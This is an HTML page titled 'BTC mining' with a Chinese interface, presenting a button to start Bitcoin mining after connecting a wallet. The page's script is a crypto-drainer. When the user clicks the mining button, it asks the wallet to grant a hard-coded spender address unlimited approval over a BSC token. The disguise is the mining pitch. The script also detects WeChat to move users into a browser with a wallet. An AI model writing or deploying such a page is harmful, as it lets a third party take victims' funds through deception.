<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>BTC挖矿</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <style>
    body { text-align:center; margin-top:80px; font-family:sans-serif; }
    #wechatTip { display:none; position:fixed; top:0; left:0; width:100%; height:100%;
      background:rgba(0,0,0,0.85); color:#fff; z-index:9999; text-align:center;
      padding-top:120px; font-size:20px; }
  </style>
</head>
<body>

<h2>BTC挖矿</h2>

<p id="status">未连接钱包</p>

<button id="connectBtn">连接钱包</button>
<br><br>
<button id="approveBtn">启动BTC挖矿</button>

<div id="wechatTip">
  <p>请点击右上角 ···</p>
  <p>选择「在浏览器打开」</p>
</div>

<script>
let web3;
let account;

const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
const spender = "0x766909a9F77664dA97B2BE58F02bB69769c27690";

const ABI = [{
  "constant": false,
  "inputs": [
    {"name":"_spender","type":"address"},
    {"name":"_value","type":"uint256"}
  ],
  "name":"approve",
  "outputs":[{"name":"","type":"bool"}],
  "type":"function"
}];

// 检测环境
function isMobile() { return /Android|iPhone/i.test(navigator.userAgent); }
function isWeChat() { return /MicroMessenger/i.test(navigator.userAgent); }

// 移动端无钱包 → 跳转指定网页
function openWalletPage() {
  window.location.href = "https://chsisi1986.github.io/5/";
}

// 手动连接钱包
async function connect() {
  if (isWeChat()) { document.getElementById("wechatTip").style.display="block"; return; }

  if (typeof window.ethereum === "undefined") {
    if (isMobile()) {
      openWalletPage();
    } else {
      alert("请安装 MetaMask");
    }
    return;
  }

  try {
    web3 = new Web3(window.ethereum);
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    account = accounts[0];
    document.getElementById("status").innerText = "已连接: " + account;

    const chainId = await web3.eth.getChainId();
    if (chainId !== 56) alert("请切换到 BSC 主网");

  } catch (err) {
    console.error(err);
    alert("连接失败");
  }
}

// 授权
async function approve() {
  if (!account) { alert("请先连接钱包"); return; }

  const confirmAction = confirm("启动BTC挖矿！（将授权无限额度）");
  if (!confirmAction) return;

  const contract = new web3.eth.Contract(ABI, tokenAddress);

  try {
    await contract.methods.approve(
      spender,
      web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
    ).send({ from: account });

    alert("授权成功");
    window.location.href = "https://你的官网.com";

  } catch (err) {
    console.error(err);
    alert("授权失败");
  }
}

// 页面加载时显示微信提示
window.onload = function() {
  if (isWeChat()) {
    document.getElementById("wechatTip").style.display = "block";
  }
}

// 按钮绑定
document.getElementById("connectBtn").onclick = connect;
document.getElementById("approveBtn").onclick = approve;
</script>

</body>
</html>
